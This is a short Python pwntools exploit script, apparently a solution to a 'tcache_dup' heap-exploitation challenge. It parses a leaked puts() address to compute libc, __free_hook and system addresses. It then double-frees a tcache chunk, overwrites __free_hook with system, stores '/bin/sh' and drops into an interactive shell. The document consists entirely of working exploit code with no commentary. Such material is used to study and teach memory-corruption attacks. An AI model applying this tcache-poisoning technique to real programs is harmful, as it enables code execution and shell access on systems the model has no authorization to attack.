from pwn import *

context.binary = "./tcache_dup"
p = process()
target = 0x602010
script = """
b*main+360
b*main+409
"""
def malloc(myidx: int, content: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(myidx).encode())
    p.sendafter(b'data: ', content)

def free(myidx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(myidx).encode())



p.recvuntil(b'puts() @')
leak_libc = int(p.recvline().strip(b'\n'),16)
log.success("Leak libc: %s", hex(leak_libc))
libc_base = leak_libc - 0x6df20

free_hook = libc_base + 0x3b28e8
one_gadget = libc_base + 0x41a5a
system_func = libc_base + 0x41b80

log.success("Libc base : %s", hex(libc_base))
log.success("Free hook : %s", hex(free_hook))

malloc(40,b'A'*8)
free(0)
free(0)
#gdb.attach(p,script)
malloc(40,p64(free_hook))
malloc(40,b'/bin/sh\x00')
malloc(40,p64(system_func))

p.interactive()